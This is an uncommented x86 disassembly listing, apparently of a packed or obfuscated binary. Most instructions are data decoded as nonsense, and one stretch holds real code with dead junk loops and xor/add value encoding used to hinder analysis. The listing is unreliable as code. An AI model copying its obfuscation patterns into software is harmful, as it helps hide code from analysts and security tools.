  4020ab:	shl    esp,0xec
  4020ae:	jmp    0x96a2:0x5b0dc9d2
  4020b5:	pop    ecx
  4020b6:	test   DWORD PTR [ebp+ecx*2-0x26],esp
  4020ba:	mov    dh,0x21
  4020bc:	add    eax,esi
  4020be:	mov    edi,0xf5753ab2
  4020c3:	into   
  4020c4:	and    al,0x2b
  4020c6:	add    dl,BYTE PTR [ecx]
  4020c8:	pushf  
  4020c9:	or     eax,0xce67d1b7
  4020ce:	mov    al,ds:0xb58a876d
  4020d3:	push   esi
  4020d4:	cmp    al,0xc5
  4020d6:	cmp    BYTE PTR [edi+0x1ee1963f],0xce
  4020dd:	ss jmp 0x47bfa675
  4020e3:	jmp    0xd91:0xb7ab57dc
  4020ea:	sub    eax,0x8066abe7
  4020ef:	mov    ss,WORD PTR [edx]
  4020f1:	aam    0xd2
  4020f3:	fld    TBYTE PTR [edi]
  4020f5:	test   DWORD PTR [ebx+0x231a3461],0xdeb6904d
  4020ff:	fld    DWORD PTR [ebx-0x444e32fe]
  402105:	outs   dx,DWORD PTR ds:[esi]
  402106:	or     BYTE PTR [esi],cl
  402108:	icebp  
  402109:	adc    DWORD PTR [ebp-0x32],ebp
  40210c:	dec    edi
  40210d:	popa   
  40210e:	pop    ebx
  40210f:	dec    esp
  402110:	dec    BYTE PTR [ecx+0x34]
  402113:	inc    esi
  402114:	scas   eax,DWORD PTR es:[edi]
  402115:	dec    esp
  402116:	push   0xd4144148
  40211b:	sahf   
  40211c:	cld    
  40211d:	repz push esp
  40211f:	scas   eax,DWORD PTR es:[edi]
  402120:	cdq    
  402121:	ret    0x8c0b
  402124:	push   ebx
  402125:	sbb    BYTE PTR [esi],0xe1
  402128:	jae    0x4020dd
  40212a:	popa   
  40212b:	and    DWORD PTR [ebp-0x56],edx
  40212e:	adc    edi,DWORD PTR [edx-0x49d77d04]
  402134:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402135:	rcr    BYTE PTR [eax+ebx*8+0x13],1
  402139:	jecxz  0x4020d8
  40213b:	push   cs
  40213c:	lock jmp FWORD PTR [edx+0x7d672595]
  402143:	cmp    ax,0xa10f
  402147:	push   ebp
  402148:	sub    ch,BYTE PTR ds:0x3bd4e15
  40214e:	stos   DWORD PTR es:[edi],eax
  40214f:	lock in eax,0x80
  402152:	cmp    eax,0xea385026
  402157:	mov    BYTE PTR [esi],ch
  402159:	imul   ebp,DWORD PTR [esi-0x123c45ce],0x7d87ca5e
  402163:	pop    edx
  402164:	inc    edi
  402165:	stos   BYTE PTR es:[edi],al
  402166:	and    eax,0xfa6097fc
  40216b:	add    al,0xc5
  40216d:	sub    dh,BYTE PTR [eax-0xa115be3]
  402173:	cld    
  402174:	retf   0xc353
  402177:	mov    esp,0x5bc9225a
  40217c:	(bad)  
  40217e:	xor    eax,0xeb0c837a
  402183:	jmp    0x2786:0x7a15958c
  40218a:	push   ebp
  40218b:	loope  0x40219a
  40218d:	hlt    
  40218e:	dec    edi
  40218f:	int3   
  402190:	dec    eax
  402191:	pop    eax
  402192:	adc    ebp,esi
  402194:	popa   
  402195:	(bad)  
  402196:	jmp    0x8b1b:0x2372ed00
  40219d:	sar    DWORD PTR [eax-0x49e33bec],cl
  4021a3:	push   ss
  4021a4:	jl     0x4021b5
  4021a6:	xchg   ecx,eax
  4021a7:	out    0x2,eax
  4021a9:	ret    0xed55
  4021ac:	inc    edi
  4021ad:	adc    eax,0x805b20f5
  4021b2:	adc    al,0x52
  4021b4:	rcl    DWORD PTR [edi],0x53
  4021b7:	xlat   BYTE PTR ds:[ebx]
  4021b8:	pop    ds
  4021b9:	popa   
  4021ba:	test   al,0x3
  4021bc:	push   ebx
  4021bd:	cmp    DWORD PTR [ecx-0x2e04bdf0],0x38555718
  4021c7:	jnp    0x40216b
  4021c9:	test   eax,0xeefc289d
  4021ce:	add    al,0x8
  4021d0:	jae    0x4021ce
  4021d2:	es jge 0x4021ef
  4021d5:	pop    esp
  4021d6:	dec    ebx
  4021d7:	xchg   ebp,eax
  4021d8:	push   esp
  4021d9:	dec    ebp
  4021da:	mov    ecx,0xc9a12f89
  4021df:	ret    0xdbe8
  4021e2:	retf   
  4021e3:	or     esp,edx
  4021e5:	hlt    
  4021e6:	dec    edx
  4021e7:	push   eax
  4021e8:	and    BYTE PTR [ecx-0x512c9d60],cl
  4021ee:	loopne 0x40224e
  4021f0:	jns    0x40221d
  4021f2:	ret    0x6f68
  4021f5:	push   ecx
  4021f6:	jno    0x4021a2
  4021f8:	xor    ch,BYTE PTR [eax+eax*8+0x2f36d91d]
  4021ff:	vsubpd xmm6,xmm2,XMMWORD PTR [esi-0x247a9f26]
  402207:	pushf  
  402208:	in     eax,dx
  402209:	test   al,0x3f
  40220b:	sub    DWORD PTR [eax-0x66],ebx
  40220e:	sar    DWORD PTR [edx],1
  402210:	jo     0x4021a8
  402212:	cs mov al,0x2e
  402215:	jmp    0x45ee6fe6
  40221a:	pop    ebp
  40221b:	xchg   DWORD PTR [eax+0x79],eax
  40221e:	push   es
  40221f:	or     DWORD PTR [eax],ebp
  402221:	inc    ebp
  402222:	pop    edi
  402223:	mov    al,BYTE PTR [edx+0x75]
  402226:	cmp    al,BYTE PTR [edx]
  402228:	imul   ebp,DWORD PTR [eax+0x6],0x7c
  40222c:	jl     0x40224e
  40222e:	mov    cl,0x70
  402230:	mov    dh,0x96
  402232:	cmp    al,0xcf
  402234:	adc    eax,0x9303cf90
  402239:	loopne 0x4021e7
  40223b:	cli    
  40223c:	cdq    
  40223d:	mov    dl,0x9
  40223f:	sbb    DWORD PTR [edi-0x73],ecx
  402242:	aad    0xfa
  402244:	and    ebx,DWORD PTR [edi+0x67]
  402247:	jae    0x402222
  402249:	pop    ebx
  40224a:	push   eax
  40224b:	scas   al,BYTE PTR es:[edi]
  40224c:	mov    bh,0xcf
  40224e:	sbb    DWORD PTR [eax+0x79f7d968],eax
  402254:	out    dx,eax
  402255:	push   edi
  402256:	sar    dh,1
  402258:	jl     0x4022bd
  40225a:	push   0xfffffff9
  40225c:	pop    edx
  40225d:	mov    bh,0x21
  40225f:	pop    eax
  402260:	add    dh,BYTE PTR [eax-0x21051966]
  402266:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402267:	and    edi,DWORD PTR [esp+edi*1]
  40226a:	jnp    0x4022db
  40226c:	in     al,dx
  40226d:	test   BYTE PTR [ecx],0x2d
  402270:	js     0x402292
  402272:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402273:	ja     0x4022b0
  402275:	std    
  402276:	inc    eax
  402277:	mov    ebp,0xd574815d
  40227c:	fwait
  40227d:	cmp    dh,BYTE PTR [eax-0x18ba6c81]
  402283:	pop    ss
  402284:	mov    dl,0xae
  402286:	int    0x50
  402288:	mov    ebp,0x1fd1a8fb
  40228d:	mov    ds:0x51f9b78d,eax
  402292:	loopne 0x4022bc
  402294:	stos   BYTE PTR es:[edi],al
  402295:	dec    ecx
  402296:	pop    ss
  402297:	sub    al,0x19
  402299:	lock push ebp
  40229b:	jbe    0x4022e7
  40229d:	daa    
  40229e:	imul   ecx,DWORD PTR [ecx+0x74],0x29
  4022a2:	int3   
  4022a3:	cmp    eax,0xa9676421
  4022a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022a9:	out    dx,al
  4022aa:	test   BYTE PTR [edi-0x6d5c5141],al
  4022b0:	lods   eax,DWORD PTR es:[esi]
  4022b2:	xchg   edi,eax
  4022b3:	dec    ebx
  4022b4:	pushf  
  4022b5:	inc    esp
  4022b6:	outs   dx,DWORD PTR ds:[esi]
  4022b7:	(bad)  
  4022b8:	adc    DWORD PTR [esi-0x4bdda9ba],edi
  4022be:	mov    ebp,0x6c1e1c5f
  4022c3:	add    al,0xf
  4022c5:	(bad)  
  4022c6:	les    ebx,FWORD PTR [edx-0x4b]
  4022c9:	test   bh,bl
  4022cb:	mov    ds:0x496fc872,al
  4022d0:	sub    DWORD PTR [edi],eax
  4022d2:	cwde   
  4022d3:	mov    eax,DWORD PTR [ecx]
  4022d5:	fiadd  DWORD PTR [eax-0x7a]
  4022d8:	push   0xeacd6e0a
  4022dd:	lods   eax,DWORD PTR ds:[esi]
  4022de:	mov    ecx,0xc3d84053
  4022e3:	add    BYTE PTR ds:0x6ec72317,bl
  4022e9:	push   0xffffffbd
  4022eb:	stos   DWORD PTR es:[edi],eax
  4022ec:	outs   dx,DWORD PTR ds:[esi]
  4022ed:	mov    ?,ecx
  4022ef:	inc    esp
  4022f0:	les    edx,FWORD PTR [ecx]
  4022f2:	push   esi
  4022f3:	ret    0xd2d7
  4022f6:	push   cs
  4022f7:	ret    0xa338
  4022fa:	or     al,0xc1
  4022fc:	das    
  4022fd:	mov    ds:0xa7bbe864,eax
  402302:	shr    DWORD PTR [edi-0x7e10bce3],cl
  402308:	xor    esp,eax
  40230a:	fwait
  40230b:	dec    ebx
  40230c:	pop    ebp
  40230d:	out    0xef,al
  40230f:	mov    esp,0xab054877
  402314:	inc    esp
  402315:	xchg   BYTE PTR [edi-0x7f],ch
  402318:	fst    QWORD PTR [ebx+0x26]
  40231b:	inc    eax
  40231c:	cwde   
  40231d:	xchg   ebp,eax
  40231e:	push   ebp
  40231f:	xchg   edx,eax
  402320:	push   ss
  402321:	(bad)  
  402322:	aad    0xcc
  402324:	adc    eax,0xa5c54fa3
  402329:	ret    0x745c
  40232c:	dec    ebp
  40232d:	sub    al,0x33
  40232f:	fnstsw WORD PTR [ebx]
  402331:	dec    ebx
  402332:	jl     0x402372
  402334:	test   DWORD PTR [ebx],edi
  402336:	mov    esp,0x245aa762
  40233b:	leave  
  40233c:	xor    ebp,DWORD PTR [edx+ebx*8]
  40233f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402340:	and    al,0x27
  402342:	cmp    cl,BYTE PTR [ecx]
  402344:	cmp    al,0x8a
  402346:	mov    ds:0x1908a6ce,eax
  40234b:	push   edx
  40234c:	out    0xe7,al
  40234e:	push   ss
  40234f:	adc    DWORD PTR [ebp+ecx*1-0x77],ebx
  402353:	inc    esi
  402354:	push   0xe786256f
  402359:	lea    eax,[ebp-0x98]
  40235f:	inc    ebx
  402360:	mov    DWORD PTR [ebp-0x8],eax
  402363:	mov    eax,DWORD PTR [ebp-0x10]
  402366:	xor    DWORD PTR ds:0x433617,ecx
  40236c:	mov    DWORD PTR [ebp-0x24],eax
  40236f:	not    ebx
  402371:	mov    eax,DWORD PTR [ebp-0x1c]
  402374:	or     ebx,DWORD PTR ds:0x4336fb
  40237a:	mov    DWORD PTR [ebp-0x20],eax
  40237d:	and    eax,ebx
  40237f:	mov    ebx,0xf89c853d
  402384:	mov    DWORD PTR [ebp-0x50],ebx
  402387:	mov    eax,DWORD PTR [ebp-0x50]
  40238a:	and    DWORD PTR ds:0x43367b,0x0
  402394:	jmp    0x4023a6
  402399:	mov    ecx,DWORD PTR ds:0x43367b
  40239f:	inc    ecx
  4023a0:	mov    DWORD PTR ds:0x43367b,ecx
  4023a6:	cmp    DWORD PTR ds:0x43367b,0x11
  4023ad:	jae    0x4023dd
  4023b3:	cmp    DWORD PTR ds:0x43367b,0x1b
  4023ba:	jne    0x4023cb
  4023c0:	push   0x4336bf
  4023c5:	call   DWORD PTR ds:0x4121bc
  4023cb:	jmp    0x402399
  4023d0:	movzx  ecx,WORD PTR ds:0x4336f7
  4023d7:	or     DWORD PTR ds:0x433667,ecx
  4023dd:	mov    ecx,DWORD PTR [ebp-0x8]
  4023e0:	xor    eax,esi
  4023e2:	add    eax,edi
  4023e4:	or     DWORD PTR ds:0x433677,0x43373f
  4023ee:	mov    DWORD PTR [ecx],eax
  4023f0:	mov    eax,DWORD PTR [ebp-0x24]
  4023f3:	and    DWORD PTR ds:0x43366f,0x0
  4023fd:	mov    ecx,DWORD PTR ds:0x43366f
  402403:	inc    ecx
  402404:	mov    DWORD PTR ds:0x43366f,ecx
  40240a:	cmp    DWORD PTR ds:0x43366f,0x5
  402411:	jne    0x402436
  402417:	push   DWORD PTR [ebp-0x14]
  40241a:	push   DWORD PTR [ebp-0x18]
  40241d:	push   DWORD PTR [ebp-0x24]
  402420:	push   DWORD PTR [ebp-0x20]
  402423:	push   0x40e6
  402428:	push   0x433810
  40242d:	push   DWORD PTR [ebp-0x10]
  402430:	call   DWORD PTR ds:0x412354
  402436:	cmp    DWORD PTR ds:0x43366f,0x4
  40243d:	jne    0x402450
  402443:	mov    ecx,DWORD PTR ds:0x43366f
  402449:	inc    ecx
  40244a:	mov    DWORD PTR ds:0x43366f,ecx
  402450:	cmp    DWORD PTR ds:0x43366f,0x1d
  402457:	jb     0x4023fd
  40245d:	mov    ecx,DWORD PTR [ebp-0x8]
  402460:	xor    eax,esi
  402462:	add    eax,edi
  402464:	mov    DWORD PTR [ecx+0x4],eax
  402467:	mov    eax,DWORD PTR [ebp-0x2c]
  40246a:	mov    ecx,DWORD PTR [ebp-0x8]
  40246d:	jmp    0x40287b
  402472:	ror    BYTE PTR [ecx-0x3a],cl
  402475:	dec    esi
  402476:	inc    ebp
  402477:	push   ecx
  402478:	push   edx
  402479:	push   ecx
  40247a:	sbb    esp,DWORD PTR [edx+0x4f6fac70]
  402480:	test   DWORD PTR [edx+edi*4+0x1],ebx
  402484:	jle    0x402504
  402486:	outs   dx,DWORD PTR ds:[esi]
  402487:	jge    0x402507
  402489:	jle    0x4024d6
  40248b:	lock xor ecx,DWORD PTR [esp+eax*2+0x55]
  402490:	out    dx,al
  402491:	scas   eax,DWORD PTR es:[edi]
  402492:	jp     0x402445
  402494:	cmp    al,0xa6
  402496:	mov    ebp,0xf5531f62
  40249b:	aaa    
  40249c:	icebp  
  40249d:	fisubr WORD PTR [ecx+0x29396d8d]
  4024a3:	jbe    0x4024d5
  4024a5:	inc    eax
  4024a6:	enter  0x585a,0xac
  4024aa:	mov    ah,0x60
  4024ac:	cmp    ah,BYTE PTR [ebx-0x6777891c]
  4024b2:	adc    eax,0x308b9dc1
  4024b7:	fwait
  4024b8:	adc    ecx,DWORD PTR [ebp-0x27]
  4024bb:	mov    BYTE PTR [edi],cl
  4024bd:	loopne 0x4024eb
  4024bf:	and    bh,BYTE PTR [ecx-0x5ed52962]
  4024c5:	sub    edx,DWORD PTR [ebp-0x61]
  4024c8:	push   ecx
  4024c9:	leave  
  4024ca:	lods   eax,DWORD PTR ds:[esi]
  4024cb:	jmp    0x4024d7
  4024cd:	dec    edi
  4024ce:	adc    esi,DWORD PTR [esi+ebx*8]
  4024d1:	out    0x14,al
  4024d3:	imul   ecx,DWORD PTR [eax-0x42],0x3201f578
  4024da:	popf   
  4024db:	ins    BYTE PTR es:[edi],dx
  4024dc:	pusha  
  4024dd:	jmp    0xa520:0x7f48cd98
  4024e4:	clc    
  4024e5:	shl    DWORD PTR [ebx+0x469ae09a],1
  4024eb:	jecxz  0x40250b
  4024ed:	fnstcw WORD PTR [edi+ebx*2+0x1]
  4024f1:	jecxz  0x40247a
  4024f3:	fwait
  4024f4:	xchg   ecx,eax
  4024f5:	addr16 (bad) 
  4024f7:	mov    bl,0x2d
  4024f9:	test   eax,0x7fb641d7
  4024fe:	and    eax,0xe4ecabcf
  402503:	sbb    eax,0x5636c629
  402508:	mov    al,0xd9
  40250a:	push   0xa48f12f0
  40250f:	add    DWORD PTR [ebx],ebp
  402511:	fs jb  0x40251c
  402514:	out    dx,al
  402515:	jg     0x4024d0
  402517:	and    bl,dl
  402519:	push   esp
  40251a:	test   ecx,ebx
  40251c:	(bad)
  40251f:	fucom  st(0)
  402521:	xlat   BYTE PTR ds:[ebx]
  402522:	jge    0x4024ad
  402524:	sahf   
  402525:	inc    eax
  402526:	mov    DWORD PTR ds:0x788d9c31,0xb197497f
  402530:	loop   0x4024be
  402532:	mov    al,ds:0x1af2a214
  402537:	es daa 
  402539:	sub    al,0xa
  40253b:	int3   
  40253c:	pop    esi
  40253d:	or     BYTE PTR [esi+ebp*1+0x3f61df6a],0xd7
  402545:	and    DWORD PTR [edx+0x3b205a60],ebp
  40254b:	dec    ebx
  40254c:	loop   0x4024fd
  40254e:	xchg   edx,eax
  40254f:	pop    ecx
  402550:	xor    DWORD PTR [esi],eax
  402552:	stos   BYTE PTR es:[edi],al
  402553:	mov    ah,0xb3
  402555:	(bad)  
  402556:	cwde   
  402557:	mov    bh,0xbc
  402559:	push   ss
  40255a:	call   0xed200a04
  40255f:	das    
  402560:	arpl   WORD PTR [edx],bx
  402562:	call   0x62b:0x4edebd28
  402569:	dec    edx
  40256a:	pcmpgtw mm1,QWORD PTR [ebp+0x60]
  40256e:	retf   0x4628
  402571:	mov    ch,0xf7
  402573:	mov    ecx,0xad1b7d44
  402578:	aas    
  402579:	dec    ebp
  40257a:	call   0x9d44338
  40257f:	cld    
  402580:	aas    
  402581:	pop    esp
  402582:	outs   dx,BYTE PTR ds:[esi]
  402583:	mov    dl,0xd8
  402585:	rcl    DWORD PTR [ebp+0x4ea875a0],0x34
  40258c:	ins    DWORD PTR es:[edi],dx
  40258d:	add    ah,al
  40258f:	shl    BYTE PTR [edi],1
  402591:	adc    DWORD PTR [ebx-0x4dcf11e7],ecx
  402597:	int    0x97
  402599:	or     DWORD PTR ds:0xd8817d57,eax
  40259f:	retf   
  4025a0:	test   al,0xb5
  4025a2:	pop    edx
  4025a3:	push   ds
  4025a4:	fiadd  DWORD PTR [eax-0x4]
  4025a7:	pushf  
  4025a8:	fld    TBYTE PTR [ecx*2-0x1a9e7dd5]
  4025af:	lock ficomp DWORD PTR [ebx+0x20cc059b]
  4025b6:	fadd   st,st(5)
  4025b8:	push   0x6b10011c
  4025bd:	sahf   
  4025be:	push   0x7e
  4025c0:	fbstp  TBYTE PTR [edx-0x64c4a5e]
  4025c6:	and    DWORD PTR [ecx+0x72],ecx
  4025c9:	pop    edi
  4025ca:	in     eax,0x9d
  4025cc:	sub    dh,cl
  4025ce:	pop    es
  4025cf:	or     DWORD PTR [ecx+0x7f],edx
  4025d2:	jecxz  0x40261b
  4025d4:	test   BYTE PTR [ebx+edx*1],bh
  4025d7:	(bad)  
  4025d8:	fyl2xp1 
  4025da:	scas   eax,DWORD PTR es:[edi]
  4025db:	xchg   ebp,eax
  4025dc:	push   0xffffffc8
  4025de:	aas    
  4025df:	adc    BYTE PTR [ecx],al
  4025e1:	into   
  4025e2:	sbb    dl,BYTE PTR [eax]
  4025e4:	push   ebx
  4025e5:	test   eax,0xba8ffe17
  4025ea:	sub    edx,DWORD PTR [esi+edx*4+0x1e082734]
  4025f1:	and    edi,DWORD PTR [ecx+eax*2-0x36be9fd5]
  4025f8:	or     eax,0xac169e5d
  4025fd:	loopne 0x402636
  4025ff:	dec    esp
  402600:	or     ah,dh
  402602:	hlt    
  402603:	adc    al,BYTE PTR [ebp+0x51]
  402606:	xchg   esi,eax
  402607:	call   0x7ff208f3
  40260c:	(bad)  [ecx+0x3003916a]
  402612:	hlt    
  402613:	mov    bh,0xf1
  402615:	dec    ecx
  402616:	push   edi
  402617:	jmp    0x4025cb
  402619:	mov    al,ds:0xaad9981a
  40261e:	rol    BYTE PTR [eax-0x24],1
  402621:	push   0xffffffaf
  402623:	dec    esp
  402624:	mov    esi,0xf5b0d27f
  402629:	and    al,0xb
  40262b:	xchg   ecx,eax
  40262c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40262d:	xor    DWORD PTR [ecx+ebx*2],esp
  402630:	add    esp,DWORD PTR [ecx+0x2fb708a9]
  402636:	and    cl,bh
  402638:	push   esi
  402639:	push   esp
  40263a:	call   0x2fb8:0x218658ce
  402641:	(bad)  
  402642:	fwait
  402643:	dec    ecx
  402644:	xchg   ah,cl
  402646:	fcomp  DWORD PTR [edi]
  402648:	dec    cx
  40264a:	mov    ah,0x80
  40264c:	or     DWORD PTR [edi],ebp
  40264e:	xchg   ecx,eax
  40264f:	xor    al,0xe
  402651:	stos   DWORD PTR es:[edi],eax
  402652:	sti    
  402653:	out    dx,eax
  402654:	mov    dl,0xd8
  402656:	jb     0x4025ef
  402658:	cmp    DWORD PTR [esi],ecx
  40265a:	xchg   ebp,eax
  40265b:	mov    al,ds:0xaedaafdf
  402660:	cmp    eax,DWORD PTR [ebp-0x54]
  402663:	ds retf 
  402665:	(bad)  
  402666:	fsubp  st(0),st
  402668:	dec    esi
  402669:	inc    esp
  40266a:	mov    dh,dl
  40266c:	enter  0xf757,0x6c
  402670:	nop
  402671:	and    DWORD PTR [ebx+0x417f6be6],eax
  402677:	out    dx,eax
  402678:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402679:	xor    ecx,eax
  40267b:	xchg   DWORD PTR [esi],esp
  40267d:	into   
  40267e:	in     eax,dx
  40267f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402680:	not    DWORD PTR [esi]
  402682:	std    
  402683:	leave  
  402684:	and    cl,bl
  402686:	mov    bh,0x63
  402688:	fmulp  st(7),st
  40268a:	js     0x4026cf
  40268c:	dec    ebp
  40268d:	adc    eax,0xa2864319
  402692:	ins    DWORD PTR es:[edi],dx
  402693:	pop    ebp
  402694:	gs jne 0x402705
  402697:	sub    DWORD PTR [esi-0x28849faf],ecx
  40269d:	rcr    DWORD PTR [edi+edi*4-0xb],0x97
  4026a2:	std    
  4026a3:	sbb    al,0xe8
  4026a5:	fcomp  QWORD PTR ds:0x6ba2e273
  4026ac:	xor    al,0xf
  4026ae:	add    al,0xcd
  4026b0:	mov    ebx,0x8ee5add4
  4026b5:	inc    ebp
  4026b6:	or     al,0xba
  4026b8:	lods   eax,DWORD PTR ds:[esi]
  4026b9:	xchg   edx,eax
  4026ba:	fstp   QWORD PTR [edi+0x7f]
  4026bd:	cmp    BYTE PTR [ebx+eax*2-0x189abb3d],0x37
  4026c5:	inc    edi
  4026c6:	and    al,BYTE PTR [edi]
  4026c8:	xor    eax,0x36b64dea
  4026cd:	mov    bh,0xd3
  4026cf:	jb     0x402657
  4026d1:	punpckldq mm4,mm3
  4026d4:	mov    ch,0xf0
  4026d6:	adc    dh,BYTE PTR [ebx]
  4026d8:	test   DWORD PTR [eax+0x4638b59d],0xdd8d523b
  4026e2:	pushf  
  4026e3:	loop   0x4026a6
  4026e5:	xor    ch,dl
  4026e7:	out    dx,al
  4026e8:	sbb    DWORD PTR [eax-0x731d461a],esp
  4026ee:	enter  0x77a2,0x7b
  4026f2:	lock dec ecx
  4026f4:	add    eax,0x93c0cd76
  4026f9:	scas   eax,DWORD PTR es:[edi]
  4026fa:	xor    eax,0x917ee994
  4026ff:	pop    ebp
  402700:	or     bl,al
  402702:	cdq    
  402703:	daa    
  402704:	ins    BYTE PTR es:[edi],dx
  402705:	nop
  402706:	sub    DWORD PTR [ebx],edx
  402708:	inc    eax
  402709:	fild   DWORD PTR [edx+0x67]
  40270c:	or     al,0xc1
  40270e:	scas   al,BYTE PTR es:[edi]
  40270f:	cs cmc 
  402711:	sbb    edx,esp
  402713:	xchg   ebp,eax
  402714:	in     eax,0xb4
  402716:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402717:	je     0x402792
  402719:	inc    eax
  40271a:	adc    ecx,DWORD PTR [edx]
  40271c:	pop    edi
  40271d:	(bad)  
  40271e:	in     eax,0x7
  402720:	or     ebx,DWORD PTR [eax]
  402722:	xor    ebp,ebp
  402724:	mov    cl,0x5a
  402726:	mov    ds:0xd81c24ba,eax
  40272b:	aas    
  40272c:	jno    0x4026e6
  40272e:	cmp    DWORD PTR [edi],ecx
  402730:	(bad)  
  402731:	dec    esi
  402732:	rcl    DWORD PTR [esi],1
  402734:	sub    esp,ebp
  402736:	push   edx
  402737:	punpckhdq mm5,QWORD PTR [esi+0x504167ab]
  40273e:	dec    ebp
  40273f:	shl    esp,0xa4
  402742:	(bad)  
  402744:	loop   0x402736
  402746:	xor    bl,BYTE PTR [edx]
  402748:	jne    0x4027a7
  40274a:	jae    0x402702
  40274c:	neg    BYTE PTR [eax+0x1f]
  40274f:	cs retf 
  402751:	inc    esi
  402752:	(bad)  
  402753:	mov    al,0x28
  402755:	test   BYTE PTR [edi],0x2a
  402758:	cli    
  402759:	jnp    0x402767
  40275b:	jo     0x4026f6
  40275d:	mov    ebp,0x1e3ed9bc
  402762:	mov    bh,0x15
  402764:	mov    ah,BYTE PTR [ebp-0x381336ad]
  40276a:	je     0x4026f7
  40276c:	and    eax,0xc1db1858
  402771:	xchg   DWORD PTR [eax],ebp
  402773:	into   
  402774:	and    ecx,DWORD PTR [esi-0xc]
  402777:	push   esi
  402778:	js     0x402789
  40277a:	push   esi
  40277b:	ret    0x34c5
  40277e:	inc    esp
  40277f:	pop    es
  402780:	sbb    DWORD PTR [edi+0x1f],eax
  402783:	mov    cl,BYTE PTR [edx-0x306858f3]
  402789:	stos   BYTE PTR es:[edi],al
  40278a:	call   0x274411eb
  40278f:	push   0xb831c04d
  402794:	or     esi,DWORD PTR [ecx]
  402796:	(bad)  
  402797:	aaa    
  402798:	mov    ah,0x30
  40279a:	mov    cl,0xeb
  40279c:	rol    DWORD PTR ds:0x7f61c033,0x4d
  4027a3:	push   esi
  4027a4:	(bad)  
  4027a5:	loope  0x4027ef
  4027a7:	cli    
  4027a8:	push   ebp
  4027a9:	xor    eax,0x4753a683
  4027ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027af:	adc    eax,0xda3dc059
  4027b4:	sbb    ebx,edi
  4027b6:	int    0x3b
  4027b8:	xor    BYTE PTR [ecx+0x49],bh
  4027bb:	cmp    BYTE PTR [edi-0x6e],cl
  4027be:	call   0x5ded:0xd197e1ca
  4027c5:	xor    al,0x40
  4027c7:	mov    edi,0xab30155e
  4027cc:	pop    ebx
  4027cd:	dec    ebx
  4027ce:	xor    DWORD PTR [edi],edx
  4027d0:	and    al,0x39
  4027d2:	inc    esi
  4027d3:	sbb    DWORD PTR [edi-0x60],0xc11c160b
  4027da:	cdq    
  4027db:	push   ebx
  4027dc:	cld    
  4027dd:	inc    esi
  4027de:	lahf   
  4027df:	mov    cl,0xa5
  4027e1:	xchg   esp,eax
  4027e2:	push   ebx
  4027e3:	aam    0xdf
  4027e5:	in     eax,dx
  4027e6:	dec    ebp
  4027e7:	call   0xb101f331
  4027ec:	rcr    DWORD PTR ds:0xc7d8e4bf,cl
  4027f2:	test   edx,edi
  4027f4:	push   ss
  4027f5:	dec    edi
  4027f6:	repz push esp
  4027f8:	das    
  4027f9:	add    esp,edi
  4027fb:	mov    eax,ds:0x49e55ff2
  402800:	jmp    0x37a0:0x2c0bd92c
  402807:	pop    ebx
  402808:	out    0x19,al
  40280a:	push   ecx
  40280b:	adc    eax,0xce185b98
  402810:	jmp    0x733faceb
  402815:	icebp  
  402816:	aaa    
  402817:	(bad)  
  402818:	jg     0x40280b
  40281a:	mov    ds:0x9a722aa8,eax
  40281f:	(bad)  
  402821:	sti    
  402822:	loope  0x402827
  402824:	push   eax
  402825:	jbe    0x4027bd
  402827:	cmp    DWORD PTR [esi-0x77dfd595],edi
  40282d:	jge    0x40287c
  40282f:	sti    
  402830:	inc    ebx
  402831:	pop    ebx
  402832:	jmp    0x4027b9
  402834:	mul    BYTE PTR [ebx+0x31b06bce]
  40283a:	mov    cl,0x53
  40283c:	fwait
  40283d:	cmp    dl,dh
  40283f:	pushf  
  402840:	sbb    ch,BYTE PTR ds:0x7be59c96
  402846:	push   ss
  402847:	xchg   ecx,eax
  402848:	dec    edi
  402849:	into   
  40284a:	mov    DWORD PTR [edi-0x1fe2a420],eax
  402850:	js     0x402805
  402852:	loopne 0x40286f
  402854:	cs leave 
  402856:	push   ecx
  402857:	push   eax
  402858:	imul   esp,DWORD PTR [ebp+ebx*8-0x7dba7a61],0xffffff8e
  402860:	pop    edi
  402861:	ret    0xa3c1
  402864:	mov    edi,0xb4644e35
  402869:	loopne 0x4027ff
  40286b:	fisubr DWORD PTR [ebx]
  40286d:	jmp    0xccfa3f8a
  402872:	push   0x5e
  402874:	cmp    BYTE PTR [edi+esi*1-0x1a67f954],al
  40287b:	mov    DWORD PTR [ecx+0x8],eax
  40287e:	mov    eax,DWORD PTR [ebp-0x30]
  402881:	mov    ecx,DWORD PTR [ebp-0x8]
  402884:	mov    DWORD PTR [ecx+0xc],eax
  402887:	mov    eax,DWORD PTR [ebp-0x34]
  40288a:	mov    ecx,DWORD PTR [ebp-0x8]
  40288d:	mov    DWORD PTR [ecx+0x10],eax
  402890:	mov    eax,eax
  402892:	mov    eax,DWORD PTR [ebp-0x20]
  402895:	xor    eax,esi
  402897:	add    eax,edi
  402899:	je     0x402cd8
  40289f:	lea    eax,[ebp-0x98]
  4028a5:	push   eax
  4028a6:	mov    eax,DWORD PTR [ebp-0x1c]
  4028a9:	xor    eax,esi
  4028ab:	add    eax,edi
  4028ad:	push   eax
  4028ae:	mov    eax,DWORD PTR [ebp-0x18]
  4028b1:	jmp    0x402cbf
  4028b6:	xor    eax,DWORD PTR [ebx]
  4028b8:	mov    dl,0xa
  4028ba:	mov    dl,0xab
  4028bc:	mov    bl,0x23
  4028be:	sbb    al,0x86
  4028c0:	adc    al,BYTE PTR [ebx-0xa9eb5a8]
  4028c6:	stos   DWORD PTR es:[edi],eax
  4028c7:	or     eax,0x7d6f7e7e
  4028cc:	jle    0x40294c
  4028ce:	mov    ebp,edx
  4028d0:	xchg   esp,eax
  4028d1:	cli    
  4028d2:	mov    ah,0xb1
  4028d4:	dec    eax
  4028d5:	les    ecx,FWORD PTR [esp+ecx*2-0x5f]
  4028d9:	sub    al,0x97
  4028db:	ret    
  4028dc:	stos   BYTE PTR es:[edi],al
  4028dd:	and    al,0x8a
  4028df:	sub    dl,BYTE PTR [esi-0x158fe475]
  4028e5:	mov    esp,0xd6630edb
  4028ea:	inc    ecx
